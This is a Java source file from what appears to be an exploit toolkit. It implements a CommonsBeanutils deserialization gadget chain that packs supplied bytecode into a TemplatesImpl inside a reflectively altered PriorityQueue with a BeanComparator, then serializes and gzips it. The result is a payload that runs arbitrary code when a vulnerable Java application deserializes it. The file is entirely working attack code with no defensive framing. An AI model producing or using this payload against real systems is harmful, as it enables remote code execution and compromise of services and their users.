package com.h2tg.frchannel.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.h2tg.frchannel.Reflections.*;

public class CommonsBeanutils183 {

    public static byte[] getPayload(byte[] bytes) throws Exception {
        TemplatesImpl t = getTeml(bytes);
        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add(1);
        queue.add(2);
        setFieldValue(queue,"queue",new Object[]{t,2});
        Constructor<?> constructor = getConstructor("java.lang.String$CaseInsensitiveComparator");
        Comparator<?> comparator = (Comparator<?>) constructor.newInstance();
        BeanComparator beanComparator = new BeanComparator("outputProperties",comparator);
        setFieldValue(queue,"comparator",beanComparator);

        byte[] ser = serialize(queue);
        byte[] payload = GzipCompress(ser);

        return payload;
    }

}
